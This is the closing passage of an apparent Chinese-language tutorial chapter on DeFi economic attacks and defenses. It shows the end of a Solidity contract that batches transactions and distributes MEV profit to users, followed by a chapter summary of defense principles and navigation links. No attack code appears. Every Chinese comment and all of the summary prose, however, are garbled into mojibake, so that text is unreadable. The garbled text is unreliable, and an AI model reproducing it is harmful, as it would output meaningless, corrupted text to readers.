                distributed[user] = true;
                
                emit MEVDistributed(user, userShare);
            }
        }
    }
    
    // è·å–å½“å‰æ‰¹æ¬¡
    function getCurrentBatch() internal returns (uint256) {
        Batch storage current = batches[currentBatchId];
        
        // å¦‚æœå½“å‰æ‰¹æ¬¡å·²ç»“æŸï¼Œåˆ›å»ºæ–°æ‰¹æ¬¡
        if (block.timestamp >= current.endTime || current.executed) {
            currentBatchId++;
            
            batches[currentBatchId] = Batch({
                id: currentBatchId,
                startTime: block.timestamp,
                endTime: block.timestamp + batchDuration,
                seed: 0,
                executed: false,
                totalValue: 0,
                mevProfit: 0
            });
            
            emit BatchCreated(currentBatchId, batches[currentBatchId].endTime);
        }
        
        return currentBatchId;
    }
    
    // ç”¨æˆ·å¯ä»¥æŸ¥è¯¢è‡ªå·±çš„MEVæ”¶ç›Š
    function getClaimableMEV(address user) external view returns (uint256) {
        if (totalMEVShares == 0) return 0;
        
        return (accumulatedMEV * userMEVShares[user]) / totalMEVShares;
    }
    
    // è·å–æ‰¹æ¬¡ä¿¡æ¯
    function getBatchInfo(uint256 batchId) external view returns (
        uint256 txCount,
        uint256 startTime,
        uint256 endTime,
        bool executed,
        uint256 mevProfit
    ) {
        Batch storage batch = batches[batchId];
        return (
            batchTransactions[batchId].length,
            batch.startTime,
            batch.endTime,
            batch.executed,
            batch.mevProfit
        );
    }
}</code></pre>
                    </div>
                </div>
            </div>
        </div>

        <h3>æœ¬ç« æ€»ç»“</h3>
        <div class="summary-box">
            <h4>å…³é”®è¦ç‚¹ï¼š</h4>
            <ul>
                <li><strong>ç»æµæ”»å‡»å¤šæ ·åŒ–</strong>ï¼šä»ç®€å•çš„ä»·æ ¼æ“çºµåˆ°å¤æ‚çš„ç³»ç»Ÿæ€§æ”»å‡»</li>
                <li><strong>åšå¼ˆè®ºè§†è§’</strong>ï¼šç†è§£å‚ä¸è€…æ¿€åŠ±æ˜¯è®¾è®¡é˜²å¾¡æœºåˆ¶çš„å…³é”®</li>
                <li><strong>åŠ¨æ€é˜²å¾¡</strong>ï¼šæ ¹æ®å¸‚åœºçŠ¶æ€è‡ªé€‚åº”è°ƒæ•´ç³»ç»Ÿå‚æ•°</li>
                <li><strong>é£é™©å…±æ‹…</strong>ï¼šé€šè¿‡ä¿é™©å’Œå…±äº«æ± åˆ†æ•£ä¸ªä½“é£é™©</li>
                <li><strong>å±æœºå“åº”</strong>ï¼šé¢„æ¡ˆå’Œè‡ªåŠ¨åŒ–å“åº”æœºåˆ¶çš„é‡è¦æ€§</li>
            </ul>
            
            <h4>é˜²å¾¡ç­–ç•¥æ ¸å¿ƒåŸåˆ™ï¼š</h4>
            <ul>
                <li>âš”ï¸ <strong>æ·±åº¦é˜²å¾¡</strong>ï¼šå¤šå±‚é˜²æŠ¤ï¼Œé¿å…å•ç‚¹å¤±è´¥</li>
                <li>ğŸ¯ <strong>æ¿€åŠ±å¯¹é½</strong>ï¼šè®©è¯šå®è¡Œä¸ºæ¯”æ”»å‡»æ›´æœ‰åˆ©å¯å›¾</li>
                <li>ğŸ”„ <strong>åŠ¨æ€é€‚åº”</strong>ï¼šæ ¹æ®å¨èƒç­‰çº§è°ƒæ•´é˜²å¾¡å¼ºåº¦</li>
                <li>ğŸ›¡ï¸ <strong>æŸå¤±é™åˆ¶</strong>ï¼šå³ä½¿è¢«æ”»ç ´ä¹Ÿè¦é™åˆ¶æŸå¤±èŒƒå›´</li>
                <li>ğŸ“Š <strong>é€æ˜ç›‘æ§</strong>ï¼šå®æ—¶ç›‘æ§å’Œå…¬å¼€æŠ«éœ²å¢å¼ºä¿¡ä»»</li>
                <li>ğŸ¤ <strong>ç¤¾åŒºå‚ä¸</strong>ï¼šåˆ©ç”¨é›†ä½“æ™ºæ…§è¯†åˆ«å’Œåº”å¯¹å¨èƒ</li>
            </ul>
            
            <h4>æœªæ¥å±•æœ›ï¼š</h4>
            <ul>
                <li>ğŸ¤– AIé©±åŠ¨çš„æ”»å‡»æ£€æµ‹å’Œè‡ªåŠ¨å“åº”</li>
                <li>ğŸ”— è·¨é“¾åä½œçš„é˜²å¾¡ç½‘ç»œ</li>
                <li>ğŸ“ˆ æ›´å¤æ‚çš„ç»æµæ¨¡å‹å’Œæ¿€åŠ±æœºåˆ¶</li>
                <li>âš–ï¸ ç›‘ç®¡æ¡†æ¶ä¸‹çš„åˆè§„é˜²å¾¡è®¾è®¡</li>
            </ul>
        </div>
    
            
            <!-- ç« èŠ‚å¯¼èˆª -->
            <div class="chapter-nav">
                <a href="chapter9.html">â† ç¬¬9ç« </a>
                <a href="chapter11.html">ç¬¬11ç«  â†’</a>
            </div>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-solidity.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-rust.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
    <script src="script.js"></script>
</body>
</html>